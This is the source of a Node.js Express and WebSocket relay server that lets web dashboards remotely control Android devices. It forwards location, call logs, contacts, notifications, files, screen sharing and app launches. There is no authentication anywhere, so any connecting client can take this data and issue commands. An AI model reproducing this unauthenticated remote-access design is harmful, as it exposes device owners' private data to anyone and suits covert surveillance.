const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));
app.use(express.json());

// HTTP logging middleware
app.use((req, res, next) => {
  console.log(`HTTP request: ${req.method} ${req.url}`);
  next();
});

// In-memory store for FCM tokens mapped by device ID
const fcmTokens = new Map();

// Endpoint for the Android app to register/update its FCM token
app.post('/api/fcm-token', (req, res) => {
  const { token, deviceId } = req.body;
  if (!token || !deviceId) {
    return res.status(400).json({ error: 'Missing token or deviceId' });
  }
  fcmTokens.set(deviceId, token);
  console.log(`[FCM] Registered token for device: ${deviceId} -> ${token.substring(0, 15)}...`);
  res.json({ success: true });
});

// Endpoint for the web client dashboard to trigger a start/stop command via FCM
app.post('/api/fcm/send', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'Missing deviceId or command' });
  }

  const token = fcmTokens.get(deviceId);
  if (!token) {
    return res.status(404).json({ error: 'No FCM token registered for this device' });
  }

  console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);

  const serverKey = process.env.FIREBASE_SERVER_KEY;
  if (!serverKey) {
    console.warn('[FCM] FIREBASE_SERVER_KEY env var not set. Cannot send real push.');
    return res.status(501).json({
      error: 'Firebase Server Key not configured on server.',
      token: token
    });
  }

  try {
    // Node 18+ has global fetch, no need for node-fetch package
    const response = await fetch('https://fcm.googleapis.com/fcm/send', {
      method: 'POST',
      headers: {
        'Authorization': `key=${serverKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: token,
        data: { command: command }
      })
    });
    const result = await response.json();
    console.log('[FCM] Push result:', result);
    res.json({ success: true, result });
  } catch (e) {
    console.error('[FCM] Push failed:', e);
    res.status(500).json({ error: e.message });
  }
});

// Serve index.html for all non-API routes
app.get(/^(?!\/api).*/, (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    console.log(`Serving index.html for ${req.url}`);
    res.sendFile(indexPath);
  } else {
    console.error(`FATAL: index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

// ─────────────────────────────────────────────────────────────
// Native WebSocket Server
// ─────────────────────────────────────────────────────────────

const wss = new WebSocketServer({
  server,
  perMessageDeflate: false // Disable compression to avoid proxy issues
});

const webClients = new Map();     // id -> ws
const androidClients = new Map(); // id -> ws
let idCounter = 0;

function generateClientId() {
  return 'ws_' + (++idCounter) + '_' + Math.random().toString(36).substring(2, 10);
}

function sendTo(ws, message) {
  if (ws && ws.readyState === 1 /* WebSocket.OPEN */) {
    ws.send(JSON.stringify(message));
  }
}

function broadcastToAndroid(message) {
  const data = JSON.stringify(message);
  androidClients.forEach((ws) => {
    if (ws.readyState === 1) ws.send(data);
  });
}

function broadcastToWeb(message) {
  const data = JSON.stringify(message);
  webClients.forEach((ws) => {
    if (ws.readyState === 1) ws.send(data);
  });
}

function findClient(id) {
  return webClients.get(id) || androidClients.get(id);
}

// All event types that are relayed between web and android
const relayEvents = [
  // WebRTC signaling
  'signal',
  // Telemetry
  'notification', 'call_log', 'location',
  // File explorer
  'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete',
  'fs:download_start', 'fs:download_chunk', 'fs:download_complete',
  'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
  'fs:upload_complete',
  // Thumbnails & preview
  'fs:thumb_request', 'fs:thumb_batch',
  'fs:preview_request', 'fs:preview_meta', 'fs:preview_chunk',
  'fs:preview_complete', 'fs:preview_error', 'fs:preview_cancel',
  // Remote commands
  'cmd:stop', 'cmd:screen_share',
  'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications',
  'cmd:set_quality', 'cmd:launch_app', 'cmd:take_snapshot',
  // Custom Data Responses
  'apps_list', 'contacts_list', 'device_info', 'snapshot_data'
];

wss.on('connection', (ws, req) => {
  const clientId = generateClientId();
  ws.clientId = clientId;
  ws.clientType = null;

  console.log(`Client connected: ${clientId} from ${req.socket.remoteAddress}`);

  // Send the assigned ID to the client immediately
  sendTo(ws, { type: 'id', id: clientId });

  ws.on('message', (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch (e) {
      console.warn(`Invalid JSON from ${clientId}: ${raw.toString().substring(0, 100)}`);
      return;
    }

    const { type, ...payload } = msg;

    if (!type) {
      console.warn(`Message without type from ${clientId}`);
      return;
    }

    // ── Identification handshake ────────────────────────────
    if (type === 'identify') {
      const clientType = payload.clientType || payload.data;
      if (clientType !== 'web' && clientType !== 'android') {
        console.warn(`Invalid clientType from ${clientId}: ${clientType}`);
        return;
      }

      ws.clientType = clientType;
      console.log(`Client ${clientId} identified as: ${clientType}`);

      if (clientType === 'web') {
        webClients.set(clientId, ws);
        androidClients.forEach((androidWs, androidId) => {
          sendTo(androidWs, { type: 'web-client-ready', id: clientId });
          sendTo(ws, { type: 'android-client-ready', id: androidId });
        });
      } else if (clientType === 'android') {
        androidClients.set(clientId, ws);
        webClients.forEach((webWs, webId) => {
          sendTo(ws, { type: 'web-client-ready', id: webId });
          sendTo(webWs, { type: 'android-client-ready', id: clientId });
        });
      }

      console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
      return;
    }

    // ── Web client re-announces itself ──────────────────────
    if (type === 'web-client-ready') {
      if (!webClients.has(clientId)) {
        webClients.set(clientId, ws);
        ws.clientType = 'web';
      }
      androidClients.forEach((androidWs) => {
        sendTo(androidWs, { type: 'web-client-ready', id: clientId });
      });
      return;
    }

    // ── Relay events between clients ────────────────────────
    if (relayEvents.includes(type)) {
      const targetId = payload.to;
      const forwardMsg = { type, ...payload, from: clientId };

      if (targetId) {
        const targetWs = findClient(targetId);
        if (targetWs) {
          sendTo(targetWs, forwardMsg);
          console.log(`Relayed ${type} from ${clientId} to ${targetId}`);
        } else {
          console.warn(`Recipient ${targetId} not found for ${type}`);
          sendTo(ws, {
            type: 'error',
            message: `Recipient ${targetId} not found`,
            code: 'RECIPIENT_NOT_FOUND'
          });
        }
      } else {
        if (webClients.has(clientId)) {
          broadcastToAndroid(forwardMsg);
          console.log(`Broadcast ${type} to all Android clients`);
        } else if (androidClients.has(clientId)) {
          broadcastToWeb(forwardMsg);
          console.log(`Broadcast ${type} to all Web clients`);
        } else {
          console.warn(`Could not route ${type} from unidentified client ${clientId}`);
        }
      }
      return;
    }

    console.warn(`Unknown message type from ${clientId}: ${type}`);
  });

  ws.on('close', () => {
    console.log(`Client disconnected: ${clientId} (type: ${ws.clientType})`);
    const wasWeb = webClients.delete(clientId);
    const wasAndroid = androidClients.delete(clientId);

    if (wasWeb) {
      broadcastToAndroid({ type: 'web-client-disconnected', id: clientId });
    }
    if (wasAndroid) {
      broadcastToWeb({ type: 'android-client-disconnected', id: clientId });
    }
    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  ws.on('error', (error) => {
    console.error(`WebSocket error from ${clientId}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT}`);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  wss.close(() => {
    server.close(() => {
      console.log('Server shut down gracefully');
      process.exit(0);
    });
  });
});
